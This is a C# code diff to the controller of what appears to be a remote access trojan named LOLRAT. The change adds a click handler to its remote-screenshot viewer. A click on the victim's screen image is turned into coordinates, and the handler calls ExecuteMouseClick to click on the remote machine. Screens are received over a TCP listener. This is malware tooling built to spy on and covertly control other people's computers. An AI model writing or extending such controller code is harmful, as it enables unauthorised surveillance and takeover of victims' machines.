@@ -17,8 +17,10 @@ namespace LOLRAT_C2
         // SS
         private TcpListener serverSS;
         private Image receivedImageSS;
+        // Add a reference to the Main class
+        private Main mainInstance;
 
-        public SS()
+        public SS(Main mainInstance)
         {
             InitializeComponent();
 
@@ -29,10 +31,52 @@ namespace LOLRAT_C2
             receivedImageSS = new Bitmap(1, 1);
             pbSS.Image = receivedImageSS;
 
+            // Store the reference to the Main instance
+            this.mainInstance = mainInstance;
+
+            // Attach the MouseClick event handler to the PictureBox
+            pbSS.MouseClick += PictureBoxMouseClickHandler;
+
             // Start listening for connections in a separate thread
             Thread listenerThread = new Thread(ListenForConnectionsSS);
             listenerThread.IsBackground = true;
             listenerThread.Start();
+        }
+
+        private void PictureBoxMouseClickHandler(object sender, MouseEventArgs e)
+        {
+            // Check if receivedImageSS is null
+            if (receivedImageSS == null)
+            {
+                MessageBox.Show("Received image is null. Ensure that the image is properly received.");
+                return;
+            }
+
+            // Calculate coordinates relative to the scaled image
+            float imageScaleX = (float)receivedImageSS.Width / pbSS.Width;
+            float imageScaleY = (float)receivedImageSS.Height / pbSS.Height;
+
+            // Check if pbSS is null
+            if (pbSS == null)
+            {
+                MessageBox.Show("PictureBox is null. Ensure that it is properly initialized.");
+                return;
+            }
+
+            // Check if pbSS.Image is null
+            if (pbSS.Image == null)
+            {
+                MessageBox.Show("PictureBox Image is null. Ensure that it is properly set.");
+                return;
+            }
+
+            int imageX = (int)(e.X * imageScaleX);
+            int imageY = (int)(e.Y * imageScaleY);
+
+            // Call the ExecuteMouseClick method on the main instance
+            mainInstance.ExecuteMouseClick(imageX, imageY, "left");
+
+            MessageBox.Show($"Clicked on image at coordinates X: {imageX}, Y: {imageY}");
         }
 
         // Add a method that will be called when the form exits
@@ -110,6 +154,5 @@ namespace LOLRAT_C2
 
             base.OnFormClosing(e);
         }
-
     }
 }
